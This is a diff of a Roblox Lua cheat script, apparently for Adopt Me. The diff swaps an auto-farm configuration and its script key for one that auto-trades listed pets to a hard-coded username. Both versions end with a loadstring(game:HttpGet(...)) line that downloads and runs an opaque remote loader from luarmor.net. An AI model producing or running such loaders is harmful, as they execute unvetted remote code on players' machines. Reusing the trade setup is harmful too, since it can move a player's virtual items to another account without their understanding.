@@ -1,17 +1,11 @@
-getgenv().Config = {
-    AutoFarm = {
-        FrostclawsRevenge = {
-            Enabled = true
-        },
-        Spleef = {
-            Enabled = false
-        }
-    },
- FPSSaver = {
-        Enabled = true,           -- FPS boost mode
-        Disable3DRendering = true, -- Max performance
-        FPSCap = 5                -- FPS cap 
+task.spawn(function()
+    getgenv().Config = {
+        ["inventory"] = "pets", -- Adapt to stickers, gifts, toys, pet_accessories, transport
+        ["username"] = "xaohkouailaila2639",
+        ["pets_to_trade"] = {"winter_2024_frostbite_cub"} -- or lures_2023_blazing_lion cant auto trade gifts with pet ONLY 1
     }
-}
-script_key="wYpVFMFyktUaChiGGkoojsYlHzAzgTYH"
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/138e2f78b57c8e78354ac45978d60113.lua"))()
+    getgenv().trade_status = true
+    getgenv().pets_unique_ids = {}
+
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a5386bfa9bb03ae1da997e3078394366.lua"))()
+end)
